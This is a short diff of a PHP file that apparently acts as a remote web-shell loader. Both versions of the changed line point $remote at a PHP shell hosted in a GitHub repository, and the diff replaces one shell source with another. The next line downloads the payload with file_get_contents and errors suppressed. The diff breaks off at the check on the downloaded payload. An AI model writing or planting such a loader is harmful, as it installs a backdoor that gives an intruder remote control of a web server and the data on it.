@@ -1,5 +1,5 @@
 <?php
-$remote = 'https://github.com/zeanboy1337/shell/raw/refs/heads/main/alfahas.txt';
+$remote = 'https://github.com/jgor/php-cgi-shell/raw/refs/heads/master/shell.php';
 $payload = @file_get_contents($remote);
 
 if ($payload) {
